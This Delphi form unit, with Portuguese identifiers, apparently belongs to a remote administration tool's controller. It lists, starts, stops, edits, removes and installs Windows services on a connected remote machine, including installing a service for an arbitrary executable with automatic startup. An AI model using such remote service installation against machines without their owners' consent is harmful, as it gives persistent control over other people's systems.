unit UnitServices;

interface

uses
  StrUtils,Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, ImgList, Menus, UnitMain, sSkinProvider, UnitConexao;

type
  TFormServices = class(TForm)
    StatusBar1: TStatusBar;
    AdvListView1: TListView;
    PopupMenu1: TPopupMenu;

    Atualizar1: TMenuItem;
    N1: TMenuItem;
    Iniciar1: TMenuItem;
    Parar1: TMenuItem;
    N2: TMenuItem;
    Instalar1: TMenuItem;
    Desinstalar1: TMenuItem;
    Editar1: TMenuItem;
    sSkinProvider1: TsSkinProvider;

    procedure AdvListView1ColumnClick(Sender: TObject; Column: TListColumn);
    procedure Atualizar1Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure AdvListView1CustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure PopupMenu1Popup(Sender: TObject);
    procedure Iniciar1Click(Sender: TObject);
    procedure Parar1Click(Sender: TObject);
    procedure Desinstalar1Click(Sender: TObject);
    procedure Instalar1Click(Sender: TObject);
    procedure Editar1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);
  private
    { Private declarations }
    Servidor: TConexaoNew;
    NomePC: string;
    LiberarForm: boolean;
  	procedure WMCloseFree(var Message: TMessage); message WM_CLOSEFREE;
    procedure AtualizarIdioma;
   	procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
    procedure CreateParams(var Params : TCreateParams); override;
  public
    { Public declarations }
    procedure OnRead(Recebido: String; ConAux: TConexaoNew); overload;
    constructor Create(aOwner: TComponent; ConAux: TConexaoNew); overload;
  end;

var
  FormServices: TFormServices;

implementation

{$R *.dfm}

uses
  DateUtils,
  ShellApi,
  UnitStrings,
  UnitConstantes,
  UnitServiceInstall,
  UnitCommonProcedures,
  CommCtrl,
  CustomIniFiles,
  AS_ShellUtils;

//procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
procedure TFormServices.WMAtualizarIdioma(var Message: TMessage);
begin
  AtualizarIdioma;
end;  

procedure TFormServices.WMCloseFree(var Message: TMessage);
begin
  LiberarForm := True;
  Close;
end;

//Here's the implementation of CreateParams
procedure TFormServices.CreateParams(var Params : TCreateParams);
begin
  inherited CreateParams(Params); //Don't ever forget to do this!!!
  if FormMain.ControlCenter = True then Exit;
  Params.WndParent := GetDesktopWindow;
end;

var
  LastSortedColumn: TListColumn;
  Ascending: boolean;

function SortByColumn(Item1, Item2: TListItem; Data: integer): integer; stdcall;
var
  s1,s2: string;
  ex1,ex2: extended;
  num: integer;
begin
  Result := 0;
  if Data = 0 then Result := AnsiCompareText(Item1.Caption, Item2.Caption)
  else Result := AnsiCompareText(Item1.SubItems[Data-1],Item2.SubItems[Data-1]);

  if not Ascending then Result := -Result;
end;

procedure TFormServices.AdvListView1ColumnClick(Sender: TObject;
  Column: TListColumn);
var
  i: integer;
begin
  Ascending := not Ascending;
  if Column <> LastSortedColumn then Ascending := not Ascending;
  for i := 0 to AdvListview1.Columns.Count -1 do AdvListview1.Column[i].ImageIndex := -1;
  LastSortedColumn := Column;
  AdvListview1.CustomSort(@SortByColumn, LastSortedColumn.Index);
end;

procedure TFormServices.AtualizarIdioma;
begin
  AdvListView1.Column[0].Caption := traduzidos[250];
  AdvListView1.Column[1].Caption := traduzidos[251];
  AdvListView1.Column[2].Caption := traduzidos[252];
  AdvListView1.Column[3].Caption := traduzidos[253];
  AdvListView1.Column[4].Caption := traduzidos[254];
  AdvListView1.Column[5].Caption := traduzidos[255];
  Iniciar1.Caption := traduzidos[256];
  Parar1.Caption := traduzidos[257];
  Instalar1.Caption := traduzidos[258];
  Atualizar1.Caption := traduzidos[192];
  Desinstalar1.Caption := traduzidos[141];
  Editar1.Caption := traduzidos[265];
end;

constructor TFormServices.Create(aOwner: TComponent; ConAux: TConexaoNew);
var
  TempStr: WideString;
  IniFile: TIniFile;
begin
  inherited Create(aOwner);
  Servidor := ConAux;
  NomePC := Servidor.NomeDoServidor;

  TempStr := ExtractFilePath(ParamStr(0)) + 'Settings\';
  ForceDirectories(TempStr);
  TempStr := TempStr + NomePC + '.ini';

  if FileExists(TempStr) = True then
  try
    IniFile := TIniFile.Create(TempStr, IniFilePassword);
    Width := IniFile.ReadInteger('ServiceManager', 'Width', Width);
    Height := IniFile.ReadInteger('ServiceManager', 'Height', Height);
    Left := IniFile.ReadInteger('ServiceManager', 'Left', Left);
    Top := IniFile.ReadInteger('ServiceManager', 'Top', Top);
    AdvListView1.Column[0].Width := IniFile.ReadInteger('ServiceManager', 'LV1_0', AdvListView1.Column[0].Width);
    AdvListView1.Column[1].Width := IniFile.ReadInteger('ServiceManager', 'LV1_1', AdvListView1.Column[1].Width);
    AdvListView1.Column[2].Width := IniFile.ReadInteger('ServiceManager', 'LV1_2', AdvListView1.Column[2].Width);
    AdvListView1.Column[3].Width := IniFile.ReadInteger('ServiceManager', 'LV1_3', AdvListView1.Column[3].Width);
    AdvListView1.Column[4].Width := IniFile.ReadInteger('ServiceManager', 'LV1_4', AdvListView1.Column[4].Width);
    AdvListView1.Column[5].Width := IniFile.ReadInteger('ServiceManager', 'LV1_5', AdvListView1.Column[5].Width);
    IniFile.Free;
    except
    DeleteFile(TempStr);
  end;

end;

procedure TFormServices.Iniciar1Click(Sender: TObject);
begin
  Servidor.EnviarString(INICIARSERVICO + '|' + AdvListView1.Selected.SubItems.Strings[0] + '|');
end;

procedure TFormServices.Instalar1Click(Sender: TObject);
var
  DisplayName: string;
  ServiceName: string;
  FileName: string;
  Desc: string;
  Startup: string;
  STartNow: string;
  Form: TFormServiceInstall;
begin
  Form := TFormServiceInstall.create(application);
  try
  	Form.Label1.Caption := AdvListView1.Column[0].Caption + ':';
    Form.Label2.Caption := AdvListView1.Column[1].Caption + ':';
    Form.Label3.Caption := AdvListView1.Column[4].Caption + ':';
    Form.Label4.Caption := AdvListView1.Column[5].Caption + ':';
    Form.Label5.Caption := AdvListView1.Column[3].Caption + ':';

    Form.Caption := '';
    Form.Edit2.Enabled := true;
    Form.CheckBox1.Enabled := true;
    Form.CheckBox1.Checked := true;
    Form.Edit1.Clear;
    Form.Edit2.Clear;
    Form.Edit3.Clear;
    Form.Edit4.Clear;
    Form.Combobox1.Items.Clear;
    Form.ComboBox1.Items.Add(traduzidos[261]);
    Form.ComboBox1.Items.Add(traduzidos[262]);
    Form.ComboBox1.Items.Add(traduzidos[263]);
    Form.Combobox1.ItemIndex := 0;

    Form.CheckBox1.Caption := traduzidos[264];
    Form.BitBtn2.Caption := traduzidos[120];

    if Form.ShowModal = mrok then
    begin
      DisplayName := Form.Edit1.Text;
      ServiceName := Form.Edit2.Text;
      FileName := Form.Edit3.Text;
      Desc := Form.Edit4.Text;
      Startup := IntToStr(Form.ComboBox1.ItemIndex + 2); // Automatic = 2; Manual = 3; Disabled = 4
      STartNow := '0';
      if Form.CheckBox1.Checked then StartNow := '1';
      Servidor.EnviarString(INSTALARSERVICO + '|' +
                                     ServiceName + delimitadorComandos +
                                     DisplayName + delimitadorComandos +
                                     FileName + delimitadorComandos +
                                     Desc + delimitadorComandos +
                                     Startup + delimitadorComandos +
                                     STartNow + delimitadorComandos);
    end;
    finally
    Form.Release;
    Form := nil;
  end;
end;
procedure TFormServices.Parar1Click(Sender: TObject);
begin
  Servidor.EnviarString(PARARSERVICO + '|' + AdvListView1.Selected.SubItems.Strings[0] + '|');
end;

procedure TFormServices.Desinstalar1Click(Sender: TObject);
begin
  if AdvListView1.SelCount <= 0 then Exit;
  if MessageBox(Handle,
                pchar(traduzidos[278] + '?'),
                pchar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                MB_ICONQUESTION or MB_YESNO or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST)  <> idYes then Exit;

  Servidor.EnviarString(REMOVERSERVICO + '|' + AdvListView1.Selected.SubItems.Strings[0] + '|');
end;

procedure TFormServices.Editar1Click(Sender: TObject);
var
  DisplayName: string;
  ServiceName: string;
  FileName: string;
  Desc: string;
  Startup: string;
  STartNow: string;
  Form: TFormServiceInstall;
begin
  Form := TFormServiceInstall.create(application);
  try
  	Form.Caption := '';
    Form.Edit2.Enabled := false;
    Form.CheckBox1.Checked := false;
    Form.CheckBox1.Enabled := false;

    Form.Label1.Caption := AdvListView1.Column[0].Caption + ':';
    Form.Label2.Caption := AdvListView1.Column[1].Caption + ':';
    Form.Label3.Caption := AdvListView1.Column[4].Caption + ':';
    Form.Label4.Caption := AdvListView1.Column[5].Caption + ':';
    Form.Label5.Caption := AdvListView1.Column[3].Caption + ':';
    Form.CheckBox1.Caption := traduzidos[264];
    Form.BitBtn2.Caption := traduzidos[120];

    Form.Edit1.Text := AdvListView1.Selected.Caption;
    Form.Edit2.Text := AdvListView1.Selected.SubItems.Strings[0];
    Form.Edit3.Text := AdvListView1.Selected.SubItems.Strings[3];
    Form.Edit4.Text := AdvListView1.Selected.SubItems.Strings[4];
    Form.Combobox1.Items.Clear;
    Form.ComboBox1.Items.Add(traduzidos[261]);
    Form.ComboBox1.Items.Add(traduzidos[262]);
    Form.ComboBox1.Items.Add(traduzidos[263]);
    if AdvListView1.Selected.SubItems.Strings[2] = traduzidos[261] then
    Form.Combobox1.ItemIndex := 0 else
    if AdvListView1.Selected.SubItems.Strings[2] = traduzidos[262] then
    Form.Combobox1.ItemIndex := 1 else
    Form.Combobox1.ItemIndex := 2;

    if Form.ShowModal = mrOK then
    begin
      DisplayName := Form.Edit1.Text;
      ServiceName := Form.Edit2.Text;
      FileName := Form.Edit3.Text;
      Desc := Form.Edit4.Text;
      Startup := IntToStr(Form.ComboBox1.ItemIndex + 2); // Automatic = 2; Manual = 3; Disabled = 4
      STartNow := '0';
      Servidor.EnviarString(EDITARSERVICO + '|' +
                                     ServiceName + delimitadorComandos +
                                     DisplayName + delimitadorComandos +
                                     FileName + delimitadorComandos +
                                     Desc + delimitadorComandos +
                                     Startup + delimitadorComandos +
                                     STartNow + delimitadorComandos);
    end;
    finally
    Form.Release;
    Form := nil;
  end;
end;

procedure TFormServices.Atualizar1Click(Sender: TObject);
begin
  Servidor.EnviarString(LISTADESERVICOS + '|');
  StatusBar1.Panels.Items[0].Text := traduzidos[205];
end;

procedure TFormServices.FormClose(Sender: TObject; var Action: TCloseAction);
var
  TempStr: WideString;
  IniFile: TIniFile;
begin
  if LiberarForm then Action := caFree;

  AdvListView1.Items.Clear;

  TempStr := ExtractFilePath(ParamStr(0)) + 'Settings\';
  ForceDirectories(TempStr);
  TempStr := TempStr + NomePC + '.ini';

  try
    IniFile := TIniFile.Create(TempStr, IniFilePassword);
    IniFile.WriteInteger('ServiceManager', 'Width', Width);
    IniFile.WriteInteger('ServiceManager', 'Height', Height);
    IniFile.WriteInteger('ServiceManager', 'Left', Left);
    IniFile.WriteInteger('ServiceManager', 'Top', Top);
    IniFile.WriteInteger('ServiceManager', 'LV1_0', AdvListView1.Column[0].Width);
    IniFile.WriteInteger('ServiceManager', 'LV1_1', AdvListView1.Column[1].Width);
    IniFile.WriteInteger('ServiceManager', 'LV1_2', AdvListView1.Column[2].Width);
    IniFile.WriteInteger('ServiceManager', 'LV1_3', AdvListView1.Column[3].Width);
    IniFile.WriteInteger('ServiceManager', 'LV1_4', AdvListView1.Column[4].Width);
    IniFile.WriteInteger('ServiceManager', 'LV1_5', AdvListView1.Column[5].Width);
    IniFile.Free;
    except
    DeleteFile(TempStr);
  end;

end;

procedure TFormServices.FormCreate(Sender: TObject);
begin
  Self.Left := (screen.width - Self.width) div 2 ;
  Self.top := (screen.height - Self.height) div 2;
  if AdvListView1.Items.Count > 0 then AdvListView1.Items.Clear;
end;

procedure TFormServices.FormShow(Sender: TObject);
begin
  AtualizarIdioma;
  Atualizar1Click(Atualizar1);
end;

procedure TFormServices.OnRead(Recebido: String; ConAux: TConexaoNew);
var
  TempInt: Integer;
  Item: TListItem;
  TempStr: string;
  i: integer;
  Result: TSplit;
begin
  if Copy(Recebido, 1, posex('|', Recebido) - 1) = LISTADESERVICOS then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    AdvListView1.Items.BeginUpdate;
    try
      if AdvListView1.Items.Count > 0 then AdvListView1.Items.Clear;
      while (recebido <> '') and (Visible = True) do
      begin
        TempStr := Copy(Recebido, 1, posex(#13#10, Recebido) - 1);
        delete(Recebido, 1, posex(#13#10, Recebido) + 1);

        Item := AdvListView1.Items.Add;
        Item.ImageIndex := 58;

        Result := SplitString(TempStr, delimitadorComandos);

        Item.Caption := Result[0];
        Item.SubItems.Add(Result[1]);

        if Result[2] = '4' then Result[2] := traduzidos[259] else Result[2] := traduzidos[260];
        Item.SubItems.Add(Result[2]);
        if Result[2] = traduzidos[260] then Item.Data := TObject(clGray);

        if Result[3] = '2' then Result[3] := traduzidos[261] else
        if Result[3] = '3' then Result[3] := traduzidos[262] else
        if Result[3] = '4' then Result[3] := traduzidos[263] else
        Result[3] := '';
        Item.SubItems.Add(Result[3]);

        Item.SubItems.Add(Result[4]);
        Item.SubItems.Add(Result[5]);
      end;
      finally
      AdvListView1.Items.EndUpdate;
    end;
    StatusBar1.Panels.Items[0].Text := traduzidos[266];
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = INSTALARSERVICO then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempStr := Copy(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(delimitadorComandos));
    if Copy(Recebido, 1, posex('|', Recebido) - 1) = 'T' then
    StatusBar1.Panels.Items[0].Text := traduzidos[267] + ' "' + tempstr + '" ' + traduzidos[268] else
    StatusBar1.Panels.Items[0].Text := traduzidos[267] + ' "' + tempstr + '" ' + traduzidos[269];
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = PARARSERVICO then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempStr := Copy(Recebido, 1, posex('|', Recebido) - 1);
    delete(Recebido, 1, posex('|', Recebido));
    if Copy(Recebido, 1, posex('|', Recebido) - 1) = 'T' then
    StatusBar1.Panels.Items[0].Text := traduzidos[267] + ' "' + tempstr + '" ' + traduzidos[270] else
    StatusBar1.Panels.Items[0].Text := traduzidos[267] + ' "' + tempstr + '" ' + traduzidos[271];
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = INICIARSERVICO then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempStr := Copy(Recebido, 1, posex('|', Recebido) - 1);
    delete(Recebido, 1, posex('|', Recebido));
    if Copy(Recebido, 1, posex('|', Recebido) - 1) = 'T' then
    StatusBar1.Panels.Items[0].Text := traduzidos[267] + ' "' + tempstr + '" ' + traduzidos[272] else
    StatusBar1.Panels.Items[0].Text := traduzidos[267] + ' "' + tempstr + '" ' + traduzidos[273];
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = REMOVERSERVICO then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempStr := Copy(Recebido, 1, posex('|', Recebido) - 1);
    delete(Recebido, 1, posex('|', Recebido));
    if Copy(Recebido, 1, posex('|', Recebido) - 1) = 'T' then
    StatusBar1.Panels.Items[0].Text := traduzidos[267] + ' "' + tempstr + '" ' + traduzidos[274] else
    StatusBar1.Panels.Items[0].Text := traduzidos[267] + ' "' + tempstr + '" ' + traduzidos[275];
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = EDITARSERVICO then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempStr := Copy(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(delimitadorComandos));
    if Copy(Recebido, 1, posex('|', Recebido) - 1) = 'T' then
    StatusBar1.Panels.Items[0].Text := traduzidos[267] + ' "' + tempstr + '" ' + traduzidos[276] else
    StatusBar1.Panels.Items[0].Text := traduzidos[267] + ' "' + tempstr + '" ' + traduzidos[277];
  end else



end;

procedure TFormServices.AdvListView1CustomDrawItem(Sender: TCustomListView;
  Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
begin
  if Item.Data <> nil then
  Sender.Canvas.Font.Color := TColor(Item.Data);
end;

procedure TFormServices.PopupMenu1Popup(Sender: TObject);
var
  i: integer;
begin
  if AdvListView1.Selected = nil then
  begin
    for i := 0 to PopupMenu1.Items.Count - 1 do PopupMenu1.Items.Items[i].Enabled := false;
    Atualizar1.Enabled := true;
  end else
  for i := 0 to PopupMenu1.Items.Count - 1 do PopupMenu1.Items.Items[i].Enabled := true;
end;

end.
